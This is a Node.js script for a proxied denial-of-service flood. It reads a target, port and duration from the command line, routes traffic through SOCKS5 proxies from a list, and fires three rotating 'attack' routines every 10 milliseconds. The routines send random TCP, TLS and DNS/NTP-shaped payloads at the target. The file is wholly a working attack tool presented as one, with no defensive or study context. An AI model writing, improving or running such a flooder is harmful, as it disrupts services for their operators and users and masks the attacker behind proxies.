const net = require('net');
const dgram = require('dgram');
const tls = require('tls');
const crypto = require('crypto');
const SocksClient = require('socks').SocksClient;
const fs = require('fs');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

// Load SOCKS5 proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync('socks5.txt', 'utf8');
    proxies = proxyData.split('\n').filter(line => line.trim() !== '');
} catch (err) {
    console.log('Error loading proxies, fetching from remote...');
}

function getRandomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Generate random data
function generatePayload(size) {
    return crypto.randomBytes(size);
}

// Different payload sizes
const payloads = {
    small: generatePayload(64),
    medium: generatePayload(512),
    large: generatePayload(1024),
    huge: generatePayload(2048)
};

// UDP Attack Methods
function generateDNSQuery() {
    const payload = Buffer.alloc(512);
    payload.writeUInt16BE(0x1234, 0);
    payload.writeUInt16BE(0x0100, 2);
    payload.writeUInt16BE(0x0001, 4);
    payload.writeUInt16BE(0x0000, 6);
    payload.writeUInt16BE(0x0000, 8);
    payload.writeUInt16BE(0x0000, 10);
    return payload;
}

function generateNTPRequest() {
    const payload = Buffer.alloc(48);
    payload[0] = 0x1b;
    return payload;
}

const udpPayloads = {
    dns: generateDNSQuery(),
    ntp: generateNTPRequest(),
    raw: generatePayload(1200)
};

// TCP Connection through SOCKS5
async function createProxiedConnection(proxyString) {
    const [proxyHost, proxyPort] = proxyString.split(':');
    
    const options = {
        proxy: {
            host: proxyHost,
            port: parseInt(proxyPort),
            type: 5
        },
        command: 'connect',
        destination: {
            host: target,
            port: parseInt(port)
        }
    };

    try {
        const info = await SocksClient.createConnection(options);
        return info.socket;
    } catch (err) {
        return null;
    }
}

// UDP through SOCKS5
async function sendUDPThroughProxy(payload, proxyString) {
    try {
        const [proxyHost, proxyPort] = proxyString.split(':');
        
        const options = {
            proxy: {
                host: proxyHost,
                port: parseInt(proxyPort),
                type: 5
            },
            command: 'connect',
            destination: {
                host: target,
                port: parseInt(port)
            }
        };

        const info = await SocksClient.createConnection(options);
        const socket = info.socket;

        socket.write(payload);
        
        setTimeout(() => {
            socket.destroy();
        }, 2000);

    } catch (err) {
        // Skip failed proxy
    }
}

// Combined Attack Methods
async function hybridFlood() {
    const proxy = getRandomProxy();
    
    // TCP part
    try {
        const socket = await createProxiedConnection(proxy);
        if (socket) {
            // Send mixed TCP data
            const interval = setInterval(() => {
                socket.write(payloads.medium);
                socket.write(payloads.small);
            }, 100);

            socket.on('error', () => {
                clearInterval(interval);
                socket.destroy();
            });

            setTimeout(() => {
                clearInterval(interval);
                socket.destroy();
            }, 15000);
        }
    } catch (err) {}

    // UDP part
    for(let i = 0; i < 30; i++) {
        await sendUDPThroughProxy(udpPayloads.raw, proxy);
    }
}

async function advancedMixedAttack() {
    const proxy = getRandomProxy();
    
    // TCP with TLS
    try {
        const rawSocket = await createProxiedConnection(proxy);
        if (rawSocket) {
            const tlsSocket = tls.connect({
                socket: rawSocket,
                rejectUnauthorized: false
            });

            const interval = setInterval(() => {
                tlsSocket.write(payloads.large);
            }, 200);

            tlsSocket.on('error', () => {
                clearInterval(interval);
                tlsSocket.destroy();
            });

            setTimeout(() => {
                clearInterval(interval);
                tlsSocket.destroy();
            }, 20000);
        }
    } catch (err) {}

    // UDP DNS and NTP mix
    for(let i = 0; i < 20; i++) {
        await sendUDPThroughProxy(udpPayloads.dns, proxy);
        await sendUDPThroughProxy(udpPayloads.ntp, proxy);
    }
}

async function burstMixedAttack() {
    const proxy = getRandomProxy();
    
    // TCP burst
    try {
        const socket = await createProxiedConnection(proxy);
        if (socket) {
            for(let i = 0; i < 50; i++) {
                socket.write(payloads.huge);
                socket.write(payloads.large);
                socket.write(payloads.medium);
            }

            socket.on('error', () => socket.destroy());

            setTimeout(() => {
                socket.destroy();
            }, 10000);
        }
    } catch (err) {}

    // UDP burst
    for(let i = 0; i < 40; i++) {
        const randomPayload = Object.values(udpPayloads)[Math.floor(Math.random() * 3)];
        await sendUDPThroughProxy(randomPayload, proxy);
        await sendUDPThroughProxy(randomPayload, proxy);
        await sendUDPThroughProxy(randomPayload, proxy);
    }
}

// Main attack loop
const methods = [
    hybridFlood,
    advancedMixedAttack,
    burstMixedAttack
];

setInterval(async () => {
    const randomMethod = methods[Math.floor(Math.random() * methods.length)];
    await randomMethod();
}, 10);

console.clear();
console.log(`
╔══════════════════════════════════════════╗
║         UDP-TCP Mixed Attack             ║
║------------------------------------------║
║ Target: ${target}
║ Port: ${port}
║ Duration: ${duration} seconds
║ Status: Running with SOCKS5 Proxies...
╚══════════════════════════════════════════╝
`);

setTimeout(() => {
    console.log('Attack completed.');
    process.exit(0);
}, duration * 1000); 